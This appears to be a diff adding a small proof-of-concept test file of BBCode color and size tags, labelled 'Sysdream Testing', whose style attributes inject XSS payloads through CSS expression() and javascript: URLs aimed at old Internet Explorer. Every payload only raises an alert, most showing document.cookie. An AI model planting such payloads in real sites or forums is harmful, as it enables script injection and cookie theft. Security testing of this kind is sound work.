@@ -1,0 +1,10 @@
+[color=#000000;xss:expression(alert(document.cookie));]Sysdream Testing XSS[/color]
+
+[size=20px;xss:expression(alert(document.cookie));]Sysdream Testing XSS[/size]
+
+[color=#000000;background-image:url(javascript:alert(&#039;Sysdream_IE6_Alert&#039;));]Sysdream
+Testing IE6[/color]
+
+[color=#000000;xss:expression(alert(&#039;Sysdream_IE7_Alert&#039;));]Sysdream Testing
+XSS[/color]
+
